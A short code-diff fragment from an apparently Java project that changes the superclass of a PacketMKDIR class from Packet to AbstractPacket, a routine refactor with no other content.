@@ -6,7 +6,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.Constants;
 
 
-public class PacketMKDIR extends Packet {
+public class PacketMKDIR extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
